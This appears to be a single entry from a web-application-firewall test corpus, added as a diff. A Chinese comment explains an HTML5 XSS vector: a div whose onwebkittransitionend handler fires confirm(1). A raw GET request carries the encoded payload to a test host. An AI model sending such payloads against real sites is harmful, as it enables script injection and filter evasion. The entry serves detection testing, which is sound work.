@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_div-06506798
+# 攻击载荷利用了HTML中的div标签和onwebkittransitionend属性，触发confirm()函数，显示一个确认框。当webkit过渡动画结束时，即webkittransitionend事件触发时，会执行其中的JavaScript代码。style="-webkit-transition: width .1s;"：这里设置了width属性的过渡效果为0.1秒。
+GET /?id=%3Cdiv%20id=%22xss%22%20onwebkittransitionend=%22confirm%281%29%22%20style=%22-webkit-transition:%20width%20.1s%3B%22%3E%3C%2Fdiv%3E&bid=hd_tag_m8mv25ae HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ae
+RM-PRO-Token: af87b908ef7033df56280958d4cfca2c
+RM-PRO-Time: 1742808455485
+User-Agent: curl/7.83.1
+
